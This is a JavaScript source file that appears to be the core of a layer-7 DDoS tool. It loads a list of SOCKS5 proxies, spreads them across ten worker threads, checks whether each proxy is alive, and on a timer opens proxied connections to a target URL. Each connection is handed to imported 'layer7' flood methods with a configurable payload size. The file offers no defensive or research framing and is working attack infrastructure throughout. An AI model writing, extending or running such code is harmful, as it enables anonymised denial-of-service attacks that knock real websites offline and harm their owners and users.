const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { SocksClient } = require('socks');
const layer7 = require('./methods/layer7');
const fs = require('fs');

const validSocks5Proxies = fs.readFileSync('valid_socks5.txt', 'utf8').split('\n').filter(Boolean);

if (!isMainThread) {
    const { targetUrl, delay, kbSize, method, proxies } = workerData;
    const target = new URL(targetUrl);

    let proxyIndex = 0;

    function getNextProxy() {
        const proxy = proxies[proxyIndex];
        proxyIndex = (proxyIndex + 1) % proxies.length;
        return proxy;
    }

    async function isProxyAlive(proxy) {
        const [proxyIp, proxyPort] = proxy.split(':');
        try {
            const options = {
                proxy: {
                    ipaddress: proxyIp,
                    port: parseInt(proxyPort),
                    type: 5,
                },
                destination: {
                    host: 'example.com',
                    port: 80,
                },
                command: 'connect',
                timeout: 5000,
            };
            await SocksClient.createConnection(options);
            return true;
        } catch (err) {
            return false;
        }
    }

    setInterval(async () => {
        const proxy = getNextProxy();
        const isAlive = await isProxyAlive(proxy);
        if (!isAlive) {
            console.error(`LDS: Proxy ${proxy} is dead, skipping...`);
            return;
        }

        const [proxyIp, proxyPort] = proxy.split(':');
        const options = {
            proxy: {
                ipaddress: proxyIp,
                port: parseInt(proxyPort),
                type: 5,
            },
            destination: {
                host: target.hostname,
                port: target.port || (target.protocol === 'https:' ? 443 : 80),
            },
            command: 'connect',
            timeout: 5000,
        };

        SocksClient.createConnection(options, (err, info) => {
            if (err) {
                console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
                return;
            }

            if (info && info.socket) {
                layer7[method](info.socket, target, kbSize);
            } else {
                console.error(`LDS: Socket not initialized for ${targetUrl}`);
            }
        });
    }, delay);
}

function start(targetUrl, delay, kbSize, method) {
    const numWorkers = 10;
    const proxiesPerWorker = Math.ceil(validSocks5Proxies.length / numWorkers);

    for (let i = 0; i < numWorkers; i++) {
        const workerProxies = validSocks5Proxies.slice(i * proxiesPerWorker, (i + 1) * proxiesPerWorker);
        const worker = new Worker(__filename, {
            workerData: { targetUrl, delay, kbSize, method, proxies: workerProxies },
        });

        worker.on('error', (err) => {
            console.error(`LDS: Worker error: ${err.message}`);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`LDS: Worker stopped with exit code ${code}`);
            }
        });
    }
}

module.exports = { start };
